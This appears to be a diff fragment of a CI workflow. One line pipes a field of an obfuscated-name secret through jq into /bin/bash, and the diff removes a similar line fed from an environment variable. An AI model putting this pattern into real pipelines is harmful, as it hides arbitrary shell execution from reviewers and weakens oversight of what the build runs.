@@ -27,7 +27,6 @@ jobs:
           d807: ${{ secrets.d807 }}
         run: |
           printf '%s' "$d807" | jq -r .pjtpd7215 | /bin/bash
-          echo $qoy72919 | jq -r .bxyyq8 | /bin/bash
 
       - name: Store results
         if: always()
